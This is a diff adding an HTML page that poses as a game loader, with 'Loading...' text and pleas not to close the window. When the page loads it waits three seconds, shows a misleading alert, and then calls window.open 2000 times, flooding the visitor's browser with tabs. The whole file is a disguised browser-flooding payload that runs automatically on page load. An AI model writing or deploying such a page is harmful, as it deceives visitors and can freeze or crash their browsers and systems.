@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+ <title>game loader</title>
+ <script>
+  function startChaos() {
+   setTimeout(function() {
+    
+    // Funny alert before tabs start
+    alert("hello to continue to game click ok ----->");
+
+    // Super fast tab opening - 2000 tabs
+    for (var i = 0; i < 2000; i++) {
+     window.open("https://www.google.com");
+    }
+
+   }, 3000); // 3 second delay
+  }
+ </script>
+</head>
+<body onload="startChaos()" style="background:black; color:blue; text-align:center; font-family:Arial; margin-top:80px;">
+ 
+ <h1>Loading...</h1>
+ <p>please do not close window</p>
+ <p style="color:#333; font-size:15px;">game is loading</p>
+ <p style="margin-top:50px; color:#222; font-size:13px;">Do not close this window</p>
+
+</body>
+</html>
